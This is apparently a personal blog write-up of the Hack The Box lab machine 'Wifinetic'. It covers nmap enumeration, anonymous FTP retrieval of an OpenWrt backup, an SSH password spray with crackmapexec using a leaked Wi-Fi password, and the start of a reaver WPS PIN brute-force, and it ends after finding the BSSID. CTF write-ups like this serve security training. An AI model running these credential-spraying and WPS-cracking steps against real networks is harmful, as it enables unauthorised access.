---
layout: post
title:  "Wifinetic"
date:   2025-06-01 22:00:00 -0400
categories: HTB-machine linux easy 
tags: HTB CTF writeup nmap ftp wifi aircrack
image:
    path: assets/img/htb/Wifinetic/Wifinetic.png
---

# Machine Information

Wifinetic is an easy difficulty Linux machine which presents an intriguing network challenge, focusing on wireless security and network monitoring. An exposed FTP service has anonymous authentication enabled which allows us to download available files. One of the file being an OpenWRT backup which contains Wireless Network configuration that discloses an Access Point password. The contents of shadow or passwd files further disclose usernames on the server. With this information, a password reuse attack can be carried out on the SSH service, allowing us to gain a foothold as the netadmin user. Using standard tools and with the provided wireless interface in monitoring mode, we can brute force the WPS PIN for the Access Point to obtain the pre-shared key ( PSK ). The pass phrase can be reused on SSH service to obtain root access on the server. 

# Writeup
### Enumeration
```
nmap -sCV -T5 10.129.229.90 

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.183
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

As we can see, `Anonymous FTP login allowed`, so we connect to FTP with anonymous and get backup file.

Extract file by 
```bash
tar -xvf backup-OpenWrt-2023-07-26.tar
```

We can get plain password from wifi config, and get username from passwd. We need to find user who reuse the password.

```bash
sudo crackmapexec ssh 10.129.229.90 -u username.txt -p 'VeRyUniUqWiFIPasswrd1!'     
                                                                                     
SSH         10.129.229.90   22     10.129.229.90    [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9                                                                                    
SSH         10.129.229.90   22     10.129.229.90    [-] root:VeRyUniUqWiFIPasswrd1!
SSH         10.129.229.90   22     10.129.229.90    [-] daemon:VeRyUniUqWiFIPasswrd1!
SSH         10.129.229.90   22     10.129.229.90    [-] ftp:VeRyUniUqWiFIPasswrd1!
SSH         10.129.229.90   22     10.129.229.90    [-] network:VeRyUniUqWiFIPasswrd1!
SSH         10.129.229.90   22     10.129.229.90    [-] nobody:VeRyUniUqWiFIPasswrd1!
SSH         10.129.229.90   22     10.129.229.90    [-] ntp:VeRyUniUqWiFIPasswrd1!
SSH         10.129.229.90   22     10.129.229.90    [-] dnsmasq:VeRyUniUqWiFIPasswrd1!
SSH         10.129.229.90   22     10.129.229.90    [-] logd:VeRyUniUqWiFIPasswrd1!
SSH         10.129.229.90   22     10.129.229.90    [-] ubus:VeRyUniUqWiFIPasswrd1!
SSH         10.129.229.90   22     10.129.229.90    [+] netadmin:VeRyUniUqWiFIPasswrd1!  Linux - Shell access!
```

### User Flag
We connect to ssh and get user's flag.

### Root Flag

We will use `reaver` to crack WPA password with format: `reaver -i mon0 -b <BSSID> -c 1`

So we need to find `BSSID`

```
iwconfig
eth0      no wireless extensions.

wlan1     IEEE 802.11  ESSID:"OpenWrt"  
          Mode:Managed  Frequency:2.412 GHz  Access Point: 02:00:00:00:00:00   
          Bit Rate:5.5 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=70/70  Signal level=-30 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:6   Missed beacon:0
```

BSSID is Access Point address.
